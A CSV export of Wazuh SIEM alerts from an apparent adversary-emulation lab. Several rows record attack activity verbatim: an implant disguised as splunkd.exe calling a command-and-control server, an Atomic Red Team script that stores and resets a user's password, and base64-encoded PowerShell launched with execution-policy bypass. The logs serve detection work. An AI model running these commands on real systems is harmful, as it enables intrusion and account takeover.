wazuh-alerts-4.x-2024.11.30,W_oYfJMBRlc-D5DFmx-T,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: EXE
UtcTime: 2024-11-30 08:03:17.146
ProcessGuid: {D8AF36FB-C38F-674A-1400-000000000900}
ProcessId: 516
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\SoftwareDistribution\Download\Install\Windows-KB890830-x64-V5.130.exe
CreationUtcTime: 2024-11-30 08:03:17.146
User: NT AUTHORITY\SYSTEM""",2,2024-11-30T08:03:17.148473800Z,50565,4148,DESKTOP-FMI6MML,11,2364,INFORMATION,Microsoft-Windows-Sysmon,30,false,6,Executable dropped in Windows root folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92217, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:03:18.231",EventChannel,1732953798.2247909,"Nov 30, 2024 @ 08:03:18.231", , , , , , , , , , , , ,516, , , , , , , , , , ,"[""Lateral Tool Transfer""]","[""T1570""]","[""Lateral Movement""]", , , , ,C:\\Windows\\system32\\svchost.exe, , , , , , ,{D8AF36FB-C38F-674A-1400-000000000900},2024-11-30 08:03:17.146, ,EXE, , ,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Windows\\SoftwareDistribution\\Download\\Install\\Windows-KB890830-x64-V5.130.exe,2024-11-30 08:03:17.146, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,XPoYfJMBRlc-D5DFmx-T,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: EXE
UtcTime: 2024-11-30 08:03:18.990
ProcessGuid: {D8AF36FB-C6C5-674A-6301-000000000900}
ProcessId: 4220
Image: C:\Windows\SoftwareDistribution\Download\Install\Windows-KB890830-x64-V5.130.exe
TargetFilename: C:\Windows\System32\MRT.exe
CreationUtcTime: 2024-11-08 12:59:21.676
User: NT AUTHORITY\SYSTEM""",2,2024-11-30T08:03:18.999875800Z,50567,4148,DESKTOP-FMI6MML,11,2364,INFORMATION,Microsoft-Windows-Sysmon,31,false,6,Executable dropped in Windows root folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92217, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:03:20.417",EventChannel,1732953800.2250627,"Nov 30, 2024 @ 08:03:20.417", , , , , , , , , , , , ,4220, , , , , , , , , , ,"[""Lateral Tool Transfer""]","[""T1570""]","[""Lateral Movement""]", , , , ,C:\\Windows\\SoftwareDistribution\\Download\\Install\\Windows-KB890830-x64-V5.130.exe, , , , , , ,{D8AF36FB-C6C5-674A-6301-000000000900},2024-11-30 08:03:18.990, ,EXE, , ,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Windows\\System32\\MRT.exe,2024-11-08 12:59:21.676, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,TvoXfJMBRlc-D5DFSx-g,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,7040,Service Control Manager,0x8080000000000000,{555908d1-a6d7-4695-8e1e-26931d2012f4},4,System,0,"""The start type of the Windows Modules Installer service was changed from auto start to demand start.""",0,2024-11-30T08:01:59.162222300Z,1785,404,DESKTOP-FMI6MML,0,644,INFORMATION,Service Control Manager,8,false,3,Service startup type was changed,"[""windows"",""windows_system"",""policy_changed""]",61104,"[""IV_35.7.d""]", ,windows_eventchannel,log,"Nov 30, 2024 @ 08:02:00.584",EventChannel,1732953720.2223350,"Nov 30, 2024 @ 08:02:00.584", , , , , , , , , , , , , , , , , , , ,"[""164.312.b""]","[""10.6""]","[""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]","[""AU.6""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,Windows Modules Installer,auto start, , ,demand start,TrustedInstaller,This does not appear to be logged on Windows 2000, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,UvoXfJMBRlc-D5DFVx9V,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,7040,Service Control Manager,0x8080000000000000,{555908d1-a6d7-4695-8e1e-26931d2012f4},4,System,0,"""The start type of the Windows Modules Installer service was changed from auto start to demand start.""",0,2024-11-30T08:02:01.318383400Z,1789,404,DESKTOP-FMI6MML,0,644,INFORMATION,Service Control Manager,12,false,3,Service startup type was changed,"[""windows"",""windows_system"",""policy_changed""]",61104,"[""IV_35.7.d""]", ,windows_eventchannel,log,"Nov 30, 2024 @ 08:02:02.728",EventChannel,1732953722.2230542,"Nov 30, 2024 @ 08:02:02.728", , , , , , , , , , , , , , , , , , , ,"[""164.312.b""]","[""10.6""]","[""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]","[""AU.6""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,Windows Modules Installer,auto start, , ,demand start,TrustedInstaller,This does not appear to be logged on Windows 2000, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,U_oXfJMBRlc-D5DFVx9V,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,7040,Service Control Manager,0x8080000000000000,{555908d1-a6d7-4695-8e1e-26931d2012f4},4,System,0,"""The start type of the Windows Modules Installer service was changed from auto start to demand start.""",0,2024-11-30T08:02:01.506123800Z,1791,404,DESKTOP-FMI6MML,0,644,INFORMATION,Service Control Manager,13,false,3,Service startup type was changed,"[""windows"",""windows_system"",""policy_changed""]",61104,"[""IV_35.7.d""]", ,windows_eventchannel,log,"Nov 30, 2024 @ 08:02:02.804",EventChannel,1732953722.2232340,"Nov 30, 2024 @ 08:02:02.804", , , , , , , , , , , , , , , , , , , ,"[""164.312.b""]","[""10.6""]","[""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]","[""AU.6""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,Windows Modules Installer,auto start, , ,demand start,TrustedInstaller,This does not appear to be logged on Windows 2000, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,VvoYfJMBRlc-D5DFBx8f,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,7040,Service Control Manager,0x8080000000000000,{555908d1-a6d7-4695-8e1e-26931d2012f4},4,System,0,"""The start type of the Windows Modules Installer service was changed from auto start to demand start.""",0,2024-11-30T08:02:39.428154500Z,1794,1052,DESKTOP-FMI6MML,0,644,INFORMATION,Service Control Manager,16,false,3,Service startup type was changed,"[""windows"",""windows_system"",""policy_changed""]",61104,"[""IV_35.7.d""]", ,windows_eventchannel,log,"Nov 30, 2024 @ 08:02:40.908",EventChannel,1732953760.2237734,"Nov 30, 2024 @ 08:02:40.908", , , , , , , , , , , , , , , , , , , ,"[""164.312.b""]","[""10.6""]","[""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]","[""AU.6""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,Windows Modules Installer,auto start, , ,demand start,TrustedInstaller,This does not appear to be logged on Windows 2000, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,PfoVfJMBRlc-D5DFzB_D,1,1,192.168.117.130,wazuh-agent,002,Maryam,"2024-12-01T07:49:21Z, RulesEngine",16384,Software Protection Platform Service,0x80000000000000,{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156},4,Application,0,"""Successfully scheduled Software Protection service for re-start at 2024-12-01T07:49:21Z. Reason: RulesEngine.""",0,2024-11-30T08:00:21.677834400Z,1690,0,DESKTOP-FMI6MML,0,0,INFORMATION,Microsoft-Windows-Security-SPP,5,false,3,Software protection service scheduled successfully.,"[""windows"",""windows_application""]",60642, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:00:22.095",EventChannel,1732953622.2149186,"Nov 30, 2024 @ 08:00:22.095", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,YPoYfJMBRlc-D5DF_R88,1,1,192.168.117.130,wazuh-agent,002,Maryam,"2024-12-01T07:49:47Z, RulesEngine",16384,Software Protection Platform Service,0x80000000000000,{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156},4,Application,0,"""Successfully scheduled Software Protection service for re-start at 2024-12-01T07:49:47Z. Reason: RulesEngine.""",0,2024-11-30T08:03:47.071598100Z,1715,0,DESKTOP-FMI6MML,0,0,INFORMATION,Microsoft-Windows-Security-SPP,7,false,3,Software protection service scheduled successfully.,"[""windows"",""windows_application""]",60642, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:03:47.493",EventChannel,1732953827.2261692,"Nov 30, 2024 @ 08:03:47.493", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,0Po6fJMBRlc-D5DFgx_N,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-11-30 08:40:22.925
ProcessGuid: {15959494-CF76-674A-2A07-000000000D00}
ProcessId: 7288
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -ExecutionPolicy Bypass -C ""if (Test-Path $env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \""$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt\"") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \""Enter password for $env:USERNAME to use during password change attempt\""; $cred.Password | ConvertFrom-SecureString | Out-File \""$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt\""};  ;  $credFile = \""$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt\""; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \""Spring$((Get-Date).Year)!\""){;       Write-Host -ForegroundColor Yellow \""The new password is the same as the password stored in the credential file. Please specify a different new password.\""; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString Spring$((Get-Date).Year)! -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \""Error code: $errCode\"";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \""The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \""Successfully changed the password to Spring$((Get-Date).Year)!\"";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \""Spring$((Get-Date).Year)!\"" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \""You must store the password of the current user by running the prerequisite commands first\""; }""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:40:22.931537400Z,56770,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,3,Powershell was used to delete files or directories,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92021, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:40:23.991",EventChannel,1732956023.2648295,"Nov 30, 2024 @ 08:40:23.991", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,7288, , , , , , , , , , ,"[""File Deletion""]","[""T1070.004""]","[""Defense Evasion""]", , , ,PowerShell.EXE,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,Microsoft® Windows® Operating System, , ,Windows PowerShell, , ,{15959494-CF76-674A-2A07-000000000D00},2024-11-30 08:40:22.925,"SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"powershell.exe -ExecutionPolicy Bypass -C \""if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \\\""$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\\\"") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \\\""Enter password for $env:USERNAME to use during password change attempt\\\""; $cred.Password | ConvertFrom-SecureString | Out-File \\\""$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\\\""};  ;  $credFile = \\\""$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\\\""; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \\\""Spring$((Get-Date).Year)!\\\""){;       Write-Host -ForegroundColor Yellow \\\""The new password is the same as the password stored in the credential file. Please specify a different new password.\\\""; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString Spring$((Get-Date).Year)! -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \\\""Error code: $errCode\\\"";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \\\""The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\\\"";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \\\""Successfully changed the password to Spring$((Get-Date).Year)!\\\"";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \\\""Spring$((Get-Date).Year)!\\\"" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \\\""You must store the password of the current user by running the prerequisite commands first\\\""; }\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,0fo6fJMBRlc-D5DFgx_N,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:40:23.036
ProcessGuid: {15959494-CF76-674A-2A07-000000000D00}
ProcessId: 7288
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_dpkqyjkx.jox.ps1
CreationUtcTime: 2024-11-30 08:40:23.036
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:40:23.038785600Z,56779,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,6,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:40:24.144",EventChannel,1732956024.2663111,"Nov 30, 2024 @ 08:40:24.144", , , , , , , , , , , , ,7288, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-CF76-674A-2A07-000000000D00},2024-11-30 08:40:23.036, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_dpkqyjkx.jox.ps1,2024-11-30 08:40:23.036, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,y_o5fJMBRlc-D5DF1B8D,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 08:39:36.909
ProcessGuid: {15959494-CF48-674A-2707-000000000D00}
ProcessId: 3648
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:39:36.911669300Z,56748,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,8,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:39:37.982",EventChannel,1732955977.2630762,"Nov 30, 2024 @ 08:39:37.982", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,3648, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-CF48-674A-2707-000000000D00},2024-11-30 08:39:36.909,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,cmd.exe /C powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,zfo5fJMBRlc-D5DF1B8D,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:39:37.020
ProcessGuid: {15959494-CF48-674A-2807-000000000D00}
ProcessId: 1192
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_ma4etxtb.kij.ps1
CreationUtcTime: 2024-11-30 08:39:37.020
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:39:37.024707100Z,56759,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,5,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:39:38.154",EventChannel,1732955978.2645284,"Nov 30, 2024 @ 08:39:38.154", , , , , , , , , , , , ,1192, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-CF48-674A-2807-000000000D00},2024-11-30 08:39:37.020, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ma4etxtb.kij.ps1,2024-11-30 08:39:37.020, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,1vo8fJMBRlc-D5DFMR9-,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:42:15.849
ProcessGuid: {15959494-CFE7-674A-3007-000000000D00}
ProcessId: 5060
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe  -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
ParentProcessGuid: {15959494-CFE7-674A-2F07-000000000D00}
ParentProcessId: 3760
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C powershell.exe -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:42:15.851079100Z,56820,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,5,false,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:42:16.972",EventChannel,1732956136.2682033,"Nov 30, 2024 @ 08:42:16.972", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,5060, , , , , , , , , , ,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , ,PowerShell.EXE,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,Microsoft® Windows® Operating System, , ,Windows PowerShell, , ,{15959494-CFE7-674A-3007-000000000D00},2024-11-30 08:42:15.849,"SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F","technique_id=T1059.001,technique_name=PowerShell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-CFE7-674A-2F07-000000000D00},cmd.exe /C powershell.exe -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==,0x107a6b,3760,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,powershell.exe  -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 